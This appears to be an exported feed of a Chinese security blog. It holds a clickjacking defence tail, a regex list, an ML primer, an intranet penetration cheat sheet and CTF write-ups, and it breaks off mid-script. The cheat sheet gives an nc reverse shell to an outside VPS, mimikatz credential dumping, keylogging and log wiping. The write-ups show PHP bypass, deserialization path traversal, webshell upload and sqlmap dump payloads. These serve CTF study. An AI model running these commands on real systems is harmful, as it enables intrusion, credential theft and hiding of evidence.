alt=""></p><p>以上主要是针对服务端的防御，如果是客户端的话，那就是保持浏览器的及时升级更新， 最新版浏览器通常具备更好更多的安全机制保护客户的信息安全，及时升级更新浏览器，可从一定程度上进行漏洞攻击的有效防范 </p><p>另一方面，作为客户端，可以通过安装浏览器的扩展插件，达到对潜在威胁进行阻止及警告，及时判断页面中的不安全因素； 如果你使用的是Firefox，则可以安装插件NoScript，在选项中设置禁止<iframe>，效果如下： </iframe></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201808120002_346.png" alt=""></p><p>有了X-Frame-Options的http头差不多就是不能进行点击劫持了吧 </p><p>这里顺便分享几个关于点击劫持的PoC工具，师傅们可以玩玩： </p><p><a href="qq://txfile/#" target="_blank" rel="external">https://github.com/enddo/CJExploiter</a> </p><p><a href="qq://txfile/#" target="_blank" rel="external">https://github.com/sensepost/jack</a> </p><p><a href="qq://txfile/#" target="_blank" rel="external">https://github.com/samyk/quickjack</a>     </p>]]></content>
      
      
      <categories>
          
          <category> WebSecurity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web漏洞 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>20个常用的正则表达式</title>
      <link href="/archives/7fe4b50e/"/>
      <url>/archives/7fe4b50e/</url>
      
        <content type="html"><![CDATA[<h1 id="20个常用的正则表达式"><a href="#20个常用的正则表达式" class="headerlink" title="20个常用的正则表达式"></a>20个常用的正则表达式</h1><h2 id="1-校验密码强度"><a href="#1-校验密码强度" class="headerlink" title="1 . 校验密码强度**"></a>1 . 校验密码强度**</h2><p>密码的强度必须是包含大小写字母和数字的组合，不能使用特殊字符，长度在8-10之间。</p><pre><code>^(?=.*\\d)(?=.*[a-z])(?=.*[A-Z]).{8,10}$</code></pre><h2 id="2-校验中文"><a href="#2-校验中文" class="headerlink" title="2. 校验中文"></a><strong>2. 校验中文</strong></h2><p>字符串仅能是中文。</p><pre><code>^[\\u4e00-\\u9fa5]{0,}$</code></pre><h2 id="3-由数字、26个英文字母或下划线组成的字符串"><a href="#3-由数字、26个英文字母或下划线组成的字符串" class="headerlink" title="3. 由数字、26个英文字母或下划线组成的字符串"></a><strong>3. 由数字、26个英文字母或下划线组成的字符串</strong></h2><pre><code>^\\w+$</code></pre><h2 id="4-校验E-Mail-地址"><a href="#4-校验E-Mail-地址" class="headerlink" title="4. 校验E-Mail 地址"></a><strong>4. 校验E-Mail 地址</strong></h2><p>同密码一样，下面是E-mail地址合规性的正则检查语句。</p><pre><code>[\\w!#$%&amp;&#39;*+/=?^_`{|}~-]+(?:\\.[\\w!#$%&amp;&#39;*+/=?^_`{|}~-]+)*@(?:[\\w](?:[\\w-]*[\\w])?\\.)+[\\w](?:[\\w-]*[\\w])?</code></pre><h2 id="5-校验身份证号码"><a href="#5-校验身份证号码" class="headerlink" title="5. 校验身份证号码"></a><strong>5. 校验身份证号码</strong></h2><p>下面是身份证号码的正则校验。15 或 18位。</p><p>15位：</p><pre><code>^[1-9]\\d{7}((0\\d)|(1[0-2]))(([0|1|2]\\d)|3[0-1])\\d{3}$</code></pre><p>18位：</p><pre><code>^[1-9]\\d{5}[1-9]\\d{3}((0\\d)|(1[0-2]))(([0|1|2]\\d)|3[0-1])\\d{3}([0-9]|X)$</code></pre><h2 id="6-校验日期"><a href="#6-校验日期" class="headerlink" title="6. 校验日期"></a><strong>6. 校验日期</strong></h2><p>“yyyy-mm-dd“ 格式的日期校验，已考虑平闰年。</p><pre><code>^(?:(?!0000)[0-9]{4}-(?:(?:0[1-9]|1[0-2])-(?:0[1-9]|1[0-9]|2[0-8])|(?:0[13-9]|1[0-2])-(?:29|30)|(?:0[13578]|1[02])-31)|(?:[0-9]{2}(?:0[48]|[2468][048]|[13579][26])|(?:0[48]|[2468][048]|[13579][26])00)-02-29)$</code></pre><h2 id="7-校验金额"><a href="#7-校验金额" class="headerlink" title="7. 校验金额"></a><strong>7. 校验金额</strong></h2><p>金额校验，精确到2位小数。</p><pre><code>^[0-9]+(.[0-9]{2})?$</code></pre><h2 id="8-校验手机号"><a href="#8-校验手机号" class="headerlink" title="8. 校验手机号"></a><strong>8. 校验手机号</strong></h2><p>下面是国内 13、15、18开头的手机号正则表达式。（可根据目前国内收集号扩展前两位开头号码）</p><pre><code>^(13[0-9]|14[5|7]|15[0|1|2|3|5|6|7|8|9]|18[0|1|2|3|5|6|7|8|9])\\d{8}$</code></pre><h2 id="9-判断IE的版本"><a href="#9-判断IE的版本" class="headerlink" title="9. 判断IE的版本"></a><strong>9. 判断IE的版本</strong></h2><p>IE目前还没被完全取代，很多页面还是需要做版本兼容，下面是IE版本检查的表达式。</p><pre><code>^.*MSIE [5-8](?:\\.[0-9]+)?(?!.*Trident\\/[5-9]\\.0).*$</code></pre><h2 id="10-校验IP-v4地址"><a href="#10-校验IP-v4地址" class="headerlink" title="10. 校验IP-v4地址"></a><strong>10. 校验IP-v4地址</strong></h2><p>IP4 正则语句。</p><pre><code>\\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\b</code></pre><h2 id="11-校验IP-v6地址"><a href="#11-校验IP-v6地址" class="headerlink" title="11. 校验IP-v6地址"></a><strong>11. 校验IP-v6地址</strong></h2><p>IP6 正则语句。</p><pre><code>(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))</code></pre><h2 id="12-检查URL的前缀"><a href="#12-检查URL的前缀" class="headerlink" title="12. 检查URL的前缀"></a><strong>12. 检查URL的前缀</strong></h2><p>应用开发中很多时候需要区分请求是HTTPS还是HTTP，通过下面的表达式可以取出一个url的前缀然后再逻辑判断。</p><pre><code>if (!s.match(/^[a-zA-Z]+:\\/\\//)){    s = &#39;http://&#39; + s;}</code></pre><h2 id="13-提取URL链接"><a href="#13-提取URL链接" class="headerlink" title="13. 提取URL链接"></a><strong>13. 提取URL链接</strong></h2><p>下面的这个表达式可以筛选出一段文本中的URL。</p><pre><code>^(f|ht){1}(tp|tps):\\/\\/([\\w-]+\\.)+[\\w-]+(\\/[\\w- ./?%&amp;=]*)?</code></pre><h2 id="14-文件路径及扩展名校验"><a href="#14-文件路径及扩展名校验" class="headerlink" title="14. 文件路径及扩展名校验"></a><strong>14. 文件路径及扩展名校验</strong></h2><p>验证windows下文件路径和扩展名（下面的例子中为.txt文件）</p><pre><code>^([a-zA-Z]\\:|\\\\)\\\\([^\\\\]+\\\\)*[^\\/:*?&quot;&lt;&gt;|]+\\.txt(l)?$</code></pre><h2 id="15-提取Color-Hex-Codes"><a href="#15-提取Color-Hex-Codes" class="headerlink" title="15. 提取Color Hex  Codes"></a><strong>15. 提取Color Hex  Codes</strong></h2><p>有时需要抽取网页中的颜色代码，可以使用下面的表达式。</p><pre><code>^#([A-Fa-f0-9]{6}|[A-Fa-f0-9]{3})$</code></pre><h2 id="16-提取网页图片"><a href="#16-提取网页图片" class="headerlink" title="16. 提取网页图片"></a><strong>16. 提取网页图片</strong></h2><p>假若你想提取网页中所有图片信息，可以利用下面的表达式。</p><pre><code>\\&lt; *[img][^\\\\&gt;]*[src] *= *[\\&quot;\\&#39;]{0,1}([^\\&quot;\\&#39;\\ &gt;]*)</code></pre><h2 id="17-提取页面超链接"><a href="#17-提取页面超链接" class="headerlink" title="17. 提取页面超链接"></a><strong>17. 提取页面超链接</strong></h2><p>提取html中的超链接。</p><pre><code>(&lt;a\\s*(?!.*\\brel=)[^&gt;]*)(href=&quot;https?:\\/\\/)((?!(?:(?:www\\.)?&#39;.implode(&#39;|(?:www\\.)?&#39;, $follow_list).&#39;))[^&quot;]+)&quot;((?!.*\\brel=)[^&gt;]*)(?:[^&gt;]*)&gt;</code></pre><h2 id="18-查找CSS属性"><a href="#18-查找CSS属性" class="headerlink" title="18. 查找CSS属性"></a><strong>18. 查找CSS属性</strong></h2><p>通过下面的表达式，可以搜索到相匹配的CSS属性。</p><pre><code>^\\s*[a-zA-Z\\-]+\\s*[:]{1}\\s[a-zA-Z0-9\\s.#]+[;]{1}</code></pre><h2 id="19-抽取注释"><a href="#19-抽取注释" class="headerlink" title="19. 抽取注释"></a><strong>19. 抽取注释</strong></h2><p>如果你需要移除HMTL中的注释，可以使用如下的表达式。</p><pre><code>&lt;!--(.*?)--&gt;</code></pre><h2 id="20-匹配HTML标签"><a href="#20-匹配HTML标签" class="headerlink" title="20. 匹配HTML标签"></a><strong>20. 匹配HTML标签</strong></h2><p>通过下面的表达式可以匹配出HTML中的标签属性。</p><pre><code class="regex">&lt;\\/?\\w+((\\s+\\w+(\\s*=\\s*(?:&quot;.*?&quot;|&#39;.*?&#39;|[\\^&#39;&quot;&gt;\\s]+))?)+\\s*|\\s*)\\/?&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> Language </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 正则 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>机器学习概念</title>
      <link href="/archives/d4eed376/"/>
      <url>/archives/d4eed376/</url>
      
        <content type="html"><![CDATA[<h1 id="机器学习概念"><a href="#机器学习概念" class="headerlink" title="机器学习概念"></a>机器学习概念</h1><h2 id="什么是机器学习"><a href="#什么是机器学习" class="headerlink" title="什么是机器学习"></a>什么是机器学习</h2><p>我们通常在计算机编程的时候，都是已知输入，然后通过一定的算法产生输出，如下图所示：</p><p><a href="http://blog.laiyum.site/uploads/18052801.jpg" target="_blank" rel="external"><img src="http://blog.laiyum.site/uploads/18052801.jpg" alt="image"></a></p><p>而还有一种情况呢，我们知道了输入和输出，但是却不知道中间的算法，这时候就需要用机器学习通过观察输入输出来学习这个算法，我们叫做知识，然后用学到的知识通过新的输入来产生输出。简而言之<strong>机器学习是用来寻找输入输出间的映射关系的</strong><br><a href="http://blog.laiyum.site/uploads/18052802.jpg" target="_blank" rel="external"><img src="http://blog.laiyum.site/uploads/18052802.jpg" alt="image"></a></p><p>其实我们人在学习思考时，脑子里也有这么个映射过程，当我们看到猫的图片，在脑子里产生了映射，于是乎，就说出了猫这个词，所以呢<strong>机器学习就是让计算机和人一样思考</strong></p><p><a href="http://blog.laiyum.site/uploads/18052803.png" target="_blank" rel="external"><img src="http://blog.laiyum.site/uploads/18052803.png" alt="image"></a></p><h2 id="机器学习相关概念的区别"><a href="#机器学习相关概念的区别" class="headerlink" title="机器学习相关概念的区别"></a>机器学习相关概念的区别</h2><p>在谈到机器学习时，我们经常会听到下面几个概念：数据挖掘，人工智能等等，那他们之间有什么联系呢？我们先来看看下面的这幅图：</p><p><a href="http://blog.laiyum.site/uploads/18052808.png" target="_blank" rel="external"><img src="http://blog.laiyum.site/uploads/18052808.png" alt="image"></a></p><p>也就是说机器学习是数据挖掘它们的底层，机器学习给它们提供算法，数据挖掘则是机器学习的应用。</p><h2 id="机器学习的应用"><a href="#机器学习的应用" class="headerlink" title="机器学习的应用"></a>机器学习的应用</h2><p>像我们熟知的Apple的faceID，google的AlphaGo，MicroSoft的小娜都是机器学习的典型应用</p><h2 id="机器学习方法"><a href="#机器学习方法" class="headerlink" title="机器学习方法"></a>机器学习方法</h2><p>实现机器学习有多种方法，这里方法是我们通常所说的算法，主要有下面几种：</p><h3 id="监督学习方法"><a href="#监督学习方法" class="headerlink" title="监督学习方法"></a>监督学习方法</h3><p>所谓监督学习方法就是说随便给一堆数据和数据对应的标签，计算机在学习之后能根据新的输入数据判断它们对应的标签。</p><p>举个例子，我们给计算机一大堆猫狗的图片，并告诉它，哪些是狗，哪些是猫，计算机学习之后，再给它看猫和狗的图片，它就能告诉我们哪些是狗，哪些是猫。</p><p><a href="http://blog.laiyum.site/uploads/18052804.png" target="_blank" rel="external"><img src="http://blog.laiyum.site/uploads/18052804.png" alt="image"></a></p><p><a href="http://blog.laiyum.site/uploads/18052805.png" target="_blank" rel="external"><img src="http://blog.laiyum.site/uploads/18052805.png" alt="image"></a></p><p>监督学习方法用于分类和回归，我们熟知的神经网络就是一种监督学习方法。</p><h3 id="非监督学习方法"><a href="#非监督学习方法" class="headerlink" title="非监督学习方法"></a>非监督学习方法</h3><p>我们有的时候只给计算机数据，不给计算机对应的标签，计算机能通过观察数据之间的规率进行数据归类<br>还是上面的例子，我们这次不告诉计算机哪些是狗，哪些是猫，计算机学习之后能把他们归类出来。</p><p><a href="http://blog.laiyum.site/uploads/18052806.png" target="_blank" rel="external"><img src="http://blog.laiyum.site/uploads/18052806.png" alt="image"></a></p><p>非监督学习用于聚类，如k-means算法</p><h3 id="半监督学习方法"><a href="#半监督学习方法" class="headerlink" title="半监督学习方法"></a>半监督学习方法</h3><p>半监督学习方法综合了监督学习和非监督学习两种方法。在初始阶段给计算机一些有标签的数据和大量没有标签的数据，计算机学习后能进行归类<br>半监督学习用于训练更高效更准确的模型，因为它既避免了带标签的数据少而的模型过拟合，也减少了打标签的工作量。</p><h3 id="强化学习"><a href="#强化学习" class="headerlink" title="强化学习"></a>强化学习</h3><p>强化学习是学习一个最优策略，可以让本体在特定环境中，根据当前的状态，做出行动，从而获得最大奖励。</p><p>来个新例子，这次，我们让计算机打篮球，我们并不需要告诉计算机怎么打篮球，我们只需要给它个篮球，让它自己打，然后我们对计算机打分，进球分越高，打分越高，这里的打分就是上面的奖励，每次计算机要做的就是获得最大奖励，一开始，面对陌生的环境，计算机并不知道怎么进球，经过奖励刺激后，命中率就会越来越高。</p><p><a href="http://blog.laiyum.site/uploads/18052807.png" target="_blank" rel="external"><img src="http://blog.laiyum.site/uploads/18052807.png" alt="image"></a></p><p>google的AlphaZero便是强化学习的典型应用</p><h3 id="遗传算法"><a href="#遗传算法" class="headerlink" title="遗传算法"></a>遗传算法</h3><p>模拟自然界优胜劣汰的进化现象，把搜索空间（问题解的组成空间）映射为遗传空间，把可能的解编码成一个向量——染色体，向量的每个元素称为基因。通过不断计算各染色体的适应值，选择最好的染色体，获得最优解。</p><p>还是拿上面的例子来说，先训练出两个打篮球的计算机ai，让这两个aic重组，变异产生后代种群，挑出最会打篮球的再进行重组变异，如此循环，每次挑出最强的</p>]]></content>
      
      
      <categories>
          
          <category> AiSecurity </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>浅谈内网渗透流程</title>
      <link href="/archives/17ef10d7/"/>
      <url>/archives/17ef10d7/</url>
      
        <content type="html"><![CDATA[<h1 id="浅谈内网渗透流程"><a href="#浅谈内网渗透流程" class="headerlink" title="浅谈内网渗透流程"></a>浅谈内网渗透流程</h1><h2 id="0x01-内网转发"><a href="#0x01-内网转发" class="headerlink" title="0x01 内网转发"></a>0x01 内网转发</h2><h3 id="lcx-内网端口转发"><a href="#lcx-内网端口转发" class="headerlink" title="lcx 内网端口转发"></a>lcx 内网端口转发</h3><p>Lcx内网端口转发<br>• lcx.exe -slave vps 3333 127.0.0.1 3389 //把主机的3389端口转发到vps的3333端口<br>• lcx.exe –listen 3333 4444 //监听3333端口，并将3333的请求转发给4444端口</p><p>本地端口转发<br>• Lcx.exe –tran 21 主机IP 3389 //将3389端口转发到21端口</p><p>通常时候内网的防火墙把3389端口ban了，无法作为端口转发出去，这个时候应该吧端口转发成21或者80端口，这些端口是有放行策略的，</p><h3 id="socks"><a href="#socks" class="headerlink" title="socks"></a>socks</h3><ul><li>Earthworm </li><li>Termite  //ew升级版 <a href="http://rootkiter.com/Termite/" target="_blank" rel="external">http://rootkiter.com/Termite/</a></li></ul><p>客户端执行：</p><pre><code>agent_windows_x86.exe -l  4444</code></pre><p>管理端执行：</p><pre><code>admin_windows_x86.exe -c 127.0.0.1 -p 4444</code></pre><p>将新的agent加入拓扑：</p><pre><code>agent_windows_x86.exe -c 127.0.0.1 -p 4444</code></pre><p>具体使用方法可参考： <a href="http://rootkiter.com/Termite/README.txt" target="_blank" rel="external">http://rootkiter.com/Termite/README.txt</a></p><ul><li><p>S5.py  //配合Proxifier一起使用</p></li><li><p>reGeorg //通过webshell 建立一个 socks 代理进行内网穿透</p><p>  s</p></li></ul><h3 id="nc反弹"><a href="#nc反弹" class="headerlink" title="nc反弹"></a>nc反弹</h3><p>反向连接<br>• nc -lvp 4444 //vps上执行<br>• nc -t -e cmd.exe vps 4444 //-t 参数是指通过telnet模式执行cmd.exe<br> 正向代理<br>• nc -l -p 4444 -t -e cmd.exe //vps上<br>• nc -vv vps 4444 //本地执行</p><h3 id="Frp"><a href="#Frp" class="headerlink" title="Frp"></a>Frp</h3><p>frp 是一个可用于内网穿透的高性能的反向代理应用，支持 tcp, udp, http, https 协议。</p><p>工具地址： <a href="https://github.com/fatedier/frp" target="_blank" rel="external">https://github.com/fatedier/frp</a></p><p><strong>frp 的作用</strong></p><p>利用处于内网或防火墙后的机器，对外网环境提供 http 或 https 服务。</p><p>对于 http, https 服务支持基于域名的虚拟主机，支持自定义域名绑定，使多个域名可以共用一个80端口。</p><p>利用处于内网或防火墙后的机器，对外网环境提供 tcp 和 udp 服务，例如在家里通过 ssh 访问处于公司内网环境内的主机。</p><p>启动frp服务器端：</p><pre><code>frps.exe -c frps.ini</code></pre><p>浏览器访问： 127.0.0.1：7500，输入frps.ini中配置的用户名和密码即可进入控制面板： </p><h3 id="ngrok"><a href="#ngrok" class="headerlink" title="ngrok"></a>ngrok</h3><p>这里仅简单演示下Windows平台上的使用：</p><p>首先在内网主机上执行（内网主机需安装Python）：</p><pre><code>python -m SimpleHTTPServer 8089</code></pre><p>我这里在Windows下用Python 2.7来演示，就执行：</p><pre><code>py -2 -m SimpleHTTPServer 8089</code></pre><p><a href="https://s9.postimg.cc/cghz3gapb/360_20180502231649460.jpg" target="_blank" rel="external"><img src="https://s9.postimg.cc/cghz3gapb/360_20180502231649460.jpg" alt="内网渗透之端口转发与代理"></a></p><p>将ngrok上传至内网主机并启动ngrok：</p><pre><code>ngrok.exe http 8089</code></pre><p><a href="https://s9.postimg.cc/7j4ei1ixb/360_20180502232222200.jpg" target="_blank" rel="external"><img src="https://s9.postimg.cc/7j4ei1ixb/360_20180502232222200.jpg" alt="内网渗透之端口转发与代理"></a></p><p>这时我们只需要在浏览器中访问：</p><pre><code>http://cdb0e21b.ngrok.io或者https://cdb0e21b.ngrok.io</code></pre><p>即可通过HTTP或者HTTPS来访问内网主机上的文件。</p><p>当然ngrok还有很多其他功能，更多使用方法请参考官方文档： <a href="https://ngrok.com/docs" target="_blank" rel="external">https://ngrok.com/docs</a></p><h2 id="0x02-信息收集"><a href="#0x02-信息收集" class="headerlink" title="0x02 信息收集"></a>0x02 信息收集</h2><h3 id="域信息"><a href="#域信息" class="headerlink" title="域信息"></a>域信息</h3><p>query user || qwinsta 查看当前在线用户</p><p>net user  查看本机用户</p><p>net user /domain 查看域用户</p><p>net view &amp; net group “domain computers” /domain 查看当前域计算机列表 第二个查的更多</p><p>net view /domain 查看有几个域</p><p>net view \\dc   查看 dc 域内共享文件</p><p>net group /domain 查看域里面的组</p><p>net group “domain admins” /domain 查看域管</p><p>net localgroup administrators /domain   /这个也是查域管，是升级为域控时，本地账户也成为域管</p><p>net group “domain controllers” /domain 域控</p><p>net time /domain </p><p>net config workstation   当前登录域 - 计算机名 - 用户名</p><p>net use \\域控(如pc.xx.com) password /user:xxx.com\username 相当于这个帐号登录域内主机，可访问资源</p><p>ipconfig</p><p>systeminfo</p><p>tasklist /svc</p><p>tasklist /S ip /U domain\username /P /V 查看远程计算机 tasklist</p><p>net localgroup administrators &amp;&amp; whoami 查看当前是不是属于管理组</p><p>netstat -ano</p><p>nltest /dclist:xx  查看域控</p><p>whoami /all 查看 Mandatory Label uac 级别和 sid 号</p><p>net sessoin 查看远程连接 session (需要管理权限)</p><p>net share     共享目录</p><p>cmdkey /l   查看保存登陆凭证</p><p>echo %logonserver%  查看登陆域</p><p>spn –l administrator spn 记录</p><p>set  环境变量</p><p>dsquery server - 查找目录中的 AD DC/LDS 实例</p><p>dsquery user - 查找目录中的用户</p><p>dsquery computer 查询所有计算机名称 windows 2003</p><p>dir /s *.exe 查找指定目录下及子目录下没隐藏文件</p><p>arp -a</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>Windows密码 //收集管理员信息</p><p>mimikatz.exe </p><p>privilege::debug</p><p>sekurlsa::logonpasswords</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201806221754_957.png" alt=""></p><p>破解lm密码使用：<a href="http://www/object_security.ch/en/opcrack.php" target="_blank" rel="external">http://www/object_security.ch/en/opcrack.php</a></p><p> token::elevate</p><p> lsadump::sam</p><p> lsadump::secrets </p><p>exit </p><p> wifi 密码： </p><p>• Mysql等数据库密码 </p><p>• 浏览器保存密码</p><p> • 浏览器历史记录</p><p> • 远程桌面历史记录</p><p> • 查找文件</p><p> • 键盘记录</p><p>keyscan_start</p><p>keyscan_dump</p><p> • 中间人</p><h2 id="0x03-横向移动"><a href="#0x03-横向移动" class="headerlink" title="0x03 横向移动"></a>0x03 横向移动</h2><p> • 端口扫描</p><p> • 命令执行</p><p> • SQL注入</p><p> • 文件上传 </p><p>• 密码爆破</p><p> • 各类CVE </p><h2 id="0x04-收尾工程"><a href="#0x04-收尾工程" class="headerlink" title="0x04 收尾工程"></a>0x04 收尾工程</h2><p>痕迹清理 </p><p>系统日志 //%systemroot%system32configSecEvent.EVT<br>• 应用程序日志 //%systemroot%system32configAppEvent.EVT<br>• FTP日志 //%systemroot%system32logfilesmsftpsvc1<br>• WWW日志 //%systemroot%system32logfilesw3svc1</p><p>参考文章</p><p><a href="http://www.freebuf.com/articles/web/170970.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/170970.html</a></p><p><a href="https://mp.weixin.qq.com/s/U2MqcjA_YmMlajJzvDCZZw" target="_blank" rel="external">https://mp.weixin.qq.com/s/U2MqcjA_YmMlajJzvDCZZw</a></p><p><a href="https://www.anquanke.com/post/id/92646" target="_blank" rel="external">https://www.anquanke.com/post/id/92646</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>安恒5月</title>
      <link href="/archives/18042369/"/>
      <url>/archives/18042369/</url>
      
        <content type="html"><![CDATA[<h2 id="奇怪的恐龙特性"><a href="#奇怪的恐龙特性" class="headerlink" title="奇怪的恐龙特性"></a>奇怪的恐龙特性</h2><p>题目</p><pre><code>大约在15亿年前，生活在地球上的恐龙中有一种很奇怪的恐龙，他们有一种奇怪的特性，那就是当在捕杀猎物的时候，如果猎物发出惊讶的表情的时候，他们也会发出惊讶的表情来告诉猎物“你们快要死了”，然而这种特性并没什么用处。。。因为我编不下去了。。以上这个故事是我瞎编的。。。</code></pre><p>题目给了代码</p><pre><code>&lt;?php highlight_file(__FILE__); ini_set(&quot;display_error&quot;, false);  error_reporting(0);  $str = isset($_GET[&#39;A_A&#39;])?$_GET[&#39;A_A&#39;]:&#39;A_A&#39;; if (strpos($_SERVER[&#39;QUERY_STRING&#39;], &quot;A_A&quot;) !==false) {     echo &#39;A_A,have fun&#39;; } elseif ($str&lt;9999999999) {     echo &#39;A_A,too small&#39;; } elseif ((string)$str&gt;0) {     echo &#39;A_A,too big&#39;; } else{     echo file_get_contents(&#39;flag.php&#39;); } ?&gt;</code></pre><p>首先第一个if判断，可以用<code>urlencode</code>绕过</p><p>然后我们需要知道php中的这样一个特性</p><pre><code>php &gt; var_dump([]&gt;9999999999);bool(true)php &gt; var_dump((string)[]&gt;0);bool(false)</code></pre><p>在php中，数组<code>[]</code>大于任何一个数</p><p>这样就可以成功绕过验证了</p><p><code>php -r &quot;var_dump([]&gt;233333333);&quot;</code></p><p>true</p><p><a href="http://101.71.29.5:10007/?A+A[]=admin" target="_blank" rel="external">http://101.71.29.5:10007/?A+A[]=admin</a></p><p>这里有个坑，flag被注释了，需要查看源代码才能看得到flag</p><pre><code>flag={09bc24026c987ae44a6e424479b2e3}</code></pre><h2 id="Mynote"><a href="#Mynote" class="headerlink" title="Mynote"></a>Mynote</h2><p>这道题目一开始我死扣xss发现无路可循后面经别人小小提醒之后，原来是个炒鸡弱智的反序列化题目，不多说<br>上图，在<code>robots.txt</code>里面发现几个可疑的页面，可能有用先记录着，直接访问<code>flag.php</code>是个假的flag。</p><p>经过别人的提示，是反序列化以后，多抓几个包看一下  在<code>upload页面</code>上传图片文件，然后返回查看图片的页面发现里面多了一个关于<code>picture</code>参数的<code>cookie</code> </p><p>解码发现是个<code>json格式</code>的东西 </p><p>这就跟反序列化联系起来了，这是一个数组类型的反序列化但直接反序列化会有报错，如下<br><img src="https://s1.ax1x.com/2018/06/23/P9MK5F.png" alt="P9MK5F.png"><br>发现是在当前目录用的函数读取页面，于是就要目录穿越一波，于是便有了下面的操作</p><pre><code class="php">&lt;?php $a[] = &#39;../../controllers/Basecontrol.php&#39;; $b[] = &#39;../../flag.php&#39;; $c[] = &#39;../../controllers/User.php&#39;; $d[] = &#39;../../controllers/Controllers.php.php&#39;;echo urlencode(base64_encode(serialize($a)));12345678</code></pre><p>把他们一个个弄到<code>picture</code>的<code>cookie</code>里面，把回显出来的<code>base64编码</code>一遍遍解码，得到源码，起初一直以为后续还要代码审计。。。结果解码flag.php的源码的时候出现了真的<code>flag</code>。。。。。尼玛坑爹，都做好审计准备了</p><pre><code class="php">&lt;?php$flag = &quot;flag{N4me_sPac4_Is_Int3r3st1ng}&quot;;echo &quot;flag{This_1S_A_F4ke_f1aG}&quot;;1234</code></pre><h2 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h2><p>本题是一个中规中矩的文件上传漏洞.</p><p>打开题目链接，我们先上传一个图片文件.上传成功，回显图片的路径.</p><p>继续上传一个php文件，便发现提示It is not a image,上传失败.</p><p>我们抓包分析一下，修改Content-Type: image/jpeg，和文件后缀，还是不能上传php文件.</p><p>想到还有一种检测文件的方法，那就是文件头标志.</p><p>于是我上传了一个图片木马，即php木马隐藏在图片中,抓包，修改文件后缀名,上传成功，但是文件后缀名被改为peg</p><p>经过一番测试，发现它是自动将文件的三位后缀名替换为peg. 我们将文件名改成mu.jpg.php,上传成功，网站打开发现，mu.peg.php 解析成功. 这考虑的是apache的特性 从后往前识别</p><h2 id=""><a href="#" class="headerlink" title=" "></a> </h2><p><img src="http://oy0tigw51.bkt.clouddn.com/201808211643_505.png" alt=""></p><p>连接菜刀，拿到flag.</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>安恒7月</title>
      <link href="/archives/b20debe2/"/>
      <url>/archives/b20debe2/</url>
      
        <content type="html"><![CDATA[<h1 id="安恒杯7月"><a href="#安恒杯7月" class="headerlink" title="安恒杯7月"></a>安恒杯7月</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="0x00-order"><a href="#0x00-order" class="headerlink" title="0x00 order"></a>0x00 order</h3><p>提示</p><p>1.右键提示 从flag表中得到flag</p><p>2.order注入</p><p>只对某一参数注入</p><p>sqlmap -u “<a href="http://101.71.29.5:10000/?order=id&amp;button=submit”" target="_blank" rel="external">http://101.71.29.5:10000/?order=id&amp;button=submit”</a> -p order</p><p>sqlmap -u “<a href="http://101.71.29.5:10000/?order=id&amp;button=submit”" target="_blank" rel="external">http://101.71.29.5:10000/?order=id&amp;button=submit”</a> -p order –dbs</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201807261044_138.png" alt=""></p><p>sqlmap -u “<a href="http://101.71.29.5:10000/?order=id&amp;button=submit”" target="_blank" rel="external">http://101.71.29.5:10000/?order=id&amp;button=submit”</a> -p order –dbs –dump-all –thread 10</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201807261613_856.png" alt=""></p><p>flag{666_0rdorby_you_can}</p><h3 id="0x01-就这么直接"><a href="#0x01-就这么直接" class="headerlink" title="0x01 就这么直接"></a>0x01 就这么直接</h3><p><img src="http://oy0tigw51.bkt.clouddn.com/201807221514_920.png" alt=""></p><p>提交查询页面跳转到 我觉得这并不是答案</p><p>右键源码得到 hint.php</p><p>访问得到代码</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201807211925_710.png" alt=""></p><p>分析：</p><p>1.访问页面的时间戳作为播种时间 </p><p>2.输出md5</p><p>php -r “echo md5(time());”</p><p>随机抽取一个md5的值输入进去</p><p>php -r “echo md(time());”</p><p>返回 答案错误</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201807211928_659.png" alt=""></p><pre><code class="python">import requestsimport reimport ioimport sysurl=&quot;http:&quot;s=requests.Session()p=s.get(url)s.encoding = 